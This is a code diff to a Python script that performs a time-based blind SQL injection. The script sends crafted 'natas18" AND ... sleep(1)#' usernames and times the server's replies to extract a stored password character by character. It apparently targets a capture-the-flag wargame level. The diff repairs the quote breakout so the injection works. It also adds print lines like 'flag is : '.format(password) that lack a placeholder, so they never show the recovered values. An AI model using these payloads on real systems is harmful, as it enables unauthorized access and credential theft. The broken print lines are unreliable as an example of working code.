@@ -18,20 +18,21 @@ time_list = []
 
 # determine only characters present in password, to reduce time
 for c in pass_charset:
-    payload["username"] = 'natas18 AND password LIKE BINARY "%{}%" AND sleep(1)#'.format(c)
+    payload["username"] = 'natas18" AND password LIKE BINARY "%{}%" AND sleep(1)#'.format(c)
     r = session.post(URL, data=payload)
     if r.elapsed.total_seconds() >= 1:
         reduced_charset += c
 
+print("reduced character set : ".format(reduced_charset))
 
 for i in range(1, 32+1):
     for c in reduced_charset:
-        payload["username"] = 'natas18 and strcmp(BINARY substr(password, {}, 1), "{}") = 0 and sleep(1)#'.format(i, c)
+        payload["username"] = 'natas18" and strcmp(BINARY substr(password, {}, 1), "{}") = 0 and sleep(1)#'.format(i, c)
         res = session.post(URL, data=payload)
         if res.elapsed.total_seconds() >= 1:
             password += c
 
-print(password)
+print("flag is : ".format(password))
 
 
 #print("guessed char: {}".format(pass_charset[time_list.index(max(time_list))]))
